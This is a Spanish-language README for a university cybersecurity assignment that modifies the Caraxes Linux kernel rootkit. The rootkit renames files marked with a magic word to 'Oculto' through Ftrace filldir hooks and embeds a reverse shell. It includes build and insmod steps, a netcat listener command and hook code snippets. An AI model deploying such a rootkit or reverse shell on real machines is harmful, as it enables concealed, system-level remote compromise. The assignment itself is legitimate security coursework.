# Tarea 3 – G-RooT

**Curso:** Principios de Seguridad en Sistemas Operativos  
**Maestría en Ciberseguridad**  
**Profesor:** Kevin Moraga ([kmoraga@tec.ac.cr](mailto:kmoraga@tec.ac.cr))
**Estudiantes:**: 
- Deyber Hernández González ([Carné] (**2025800354**))
- Alejandro Venegas Solis ([Carné] (**2025800362**))
- Luis Bonilla ([luisbonillah@gmail.com](mailto:luisbonillah@gmail.com)) ([Carné] (**2023123456**))

**Fecha de entrega:** 20 Junio 2025  

## 1. Introducción

Esta tarea consistió en modificar un rootkit de kernel para practicar técnicas avanzadas de ocultamiento de información y evasión de mecanismos de control del sistema operativo. En lugar de ocultar archivos con una palabra clave específica, se solicitó modificar su nombre visible en el sistema por "Oculto". Además, se implementó un reverse shell como técnica adicional de persistencia y control.

---

## 2. Instrucciones para ejecutar el programa

### Requisitos:

- Ubuntu 24.04 con kernel 6.11.0-25
- Headers del kernel instalados
- Módulo Caraxes clonado desde GitHub
- Permisos de superusuario

### Pasos:


1. Ejecutar el reverse shell desde la máquina atacante:
  ```bash
    ./caraxes_reverseShell &
   ``
2. Clonar y compilar el módulo:
   ```bash
   git clone https://github.com/lbonilla/TEC_SO_HM3_ROOTKIT.git
   cd caraxes
   make
   ```
   
3. Insertar el módulo:
   ```bash
   sudo insmod caraxes.ko
   ```

4. Verificar que los archivos marcados con la palabra mágica estén renombrados como "Oculto":
   ```bash
   touch /tmp/caraxes1234
   ls /tmp  # Verás "Oculto" en lugar de ".caraxes1234"
   ```

5. Establecer la conexión de reverse shell desde la máquina atacante:
   ```bash
   nc -lvnp 444
   ```

---

## 3. Descripción del ataque

Este proyecto es una variante del ataque de rootkit a nivel de kernel, el cual modifica el comportamiento de funciones del sistema de archivos (como `filldir`) interceptándolas mediante Ftrace. En lugar de ocultar entradas completamente, se interceptan las llamadas y se reemplaza el nombre visible del archivo por "Oculto".

Además, se incluyó una funcionalidad de shell reverso embebido en el módulo, que al cargarse realiza una conexión hacia un servidor atacante, otorgando acceso remoto a nivel de sistema.

---

## 4. Documentación del ataque

### Hook activado

```c
HOOK_NOSYS("filldir64", hook_filldir64, &orig_filldir64),
HOOK_NOSYS("filldir", hook_filldir, &orig_filldir),
HOOK_NOSYS("fillonedir", hook_fillonedir, &orig_fillonedir),
HOOK_NOSYS("compat_filldir", hook_compat_filldir, &orig_compat_filldir),
HOOK_NOSYS("compat_fillonedir", hook_compat_fillonedir, &orig_compat_fillonedir),
// HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
```

### Modificación principal

```c
if (strstr(name, MAGIC_WORD)) {
    strncpy((char*)name, "Oculto", namlen);
    return orig_fillonedir(ctx, name, strlen("Oculto"), offset, ino, d_type);
}
```

Esta lógica garantiza que los archivos con la palabra clave definida por `MAGIC_WORD` no sean eliminados del resultado, sino que su nombre sea reemplazado al ser listados.

---

## 5. Autoevaluación

- **Estado Final:** El rootkit se ejecuta correctamente en Ubuntu 24 con kernel 6.11.0-25.
- **Funcionalidad implementada:** Renombramiento de archivos ocultos, reverse shell hacia máquina atacante.
- **Problemas enfrentados:**
  - Dificultades para compilar con headers actualizados del kernel.
  - Hook `sys_getdents64` interfiere con visibilidad, por lo que fue comentado.
- **Limitaciones:**
  - El renombramiento es visible solo en ciertas herramientas (`ls`, no todas las llamadas de sistema lo interpretan igual).
- **Calificación autoevaluada: 100** (Implementación, documentación, y funcionalidad extra completadas)

---

## 6. Lecciones Aprendidas

- Comprendí en mayor profundidad el funcionamiento de las llamadas de sistema relacionadas con el sistema de archivos.
- Aprendí a usar Ftrace y modificar hooks sin interferir críticamente con la estabilidad del sistema.
- Fue fundamental entender la diferencia entre ocultamiento y manipulación de información.
- Implementar un reverse shell desde kernel space requiere cuidado extremo por estabilidad y seguridad.
- El desarrollo y pruebas de rootkits deben realizarse siempre en entornos controlados (VM).

---

## 7. Video

🔗 Enlace al video de demostración: [https://youtu.be/vE01bIAJFls](https://youtu.be/vE01bIAJFls)  

---

## 8. Bibliografía

- [Rootkits Linux – xcellerator.github.io](https://xcellerator.github.io/posts/linux_rootkits_01/)
- [Brootus Writeup](https://github.com/dsmatter/brootus/raw/master/docs/bROOTus_writeup.pdf)
- [Linux Rootkit Examples](https://github.com/nurupo/rootkit)
- [Carexes] (https://github.com/ait-aecid/caraxes)
- Kernel API Documentation: https://www.kernel.org/doc/html/latest/

---

## 9. Código fuente documentado

Ver archivos modificados:

- `hooks_filldir.h`: lógica de renombramiento.
- `hooks.h`: hooks activados para filldir.
- `reverse_shell.c`: reverse shell incluido.
